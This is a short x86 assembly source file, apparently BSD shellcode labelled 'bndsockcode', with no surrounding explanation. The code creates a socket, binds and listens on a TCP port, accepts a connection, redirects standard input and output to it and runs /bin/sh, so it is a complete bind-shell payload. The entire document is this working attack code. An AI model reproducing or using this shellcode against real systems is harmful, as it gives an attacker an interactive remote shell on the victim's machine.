.globl start

start:

# 74 bytes

bndsockcode:
    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x5c1102ff
    movl    %esp,%edi

    pushl   %eax
    pushl   $0x01
    pushl   $0x02
    pushl   $0x10
    movb    $0x61,%al
    int     $0x80

    pushl   %edi
    pushl   %eax
    pushl   %eax
    pushl   $0x68
    popl    %eax
    int     $0x80

    movl    %eax,-0x14(%edi)
    movb    $0x6a,%al
    int     $0x80

    movb    $0x1e,%al
    int     $0x80

    pushl   %eax
    pushl   %eax

0:
    pushl   $0x5a
    popl    %eax
    int     $0x80

    decl    -0x1c(%edi)
    jns     0b

shellcode:
#    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %esp
    pushl   %esp
    pushl   %ebx
    pushl   %eax
    movb    $0x3b,%al
    int     $0x80
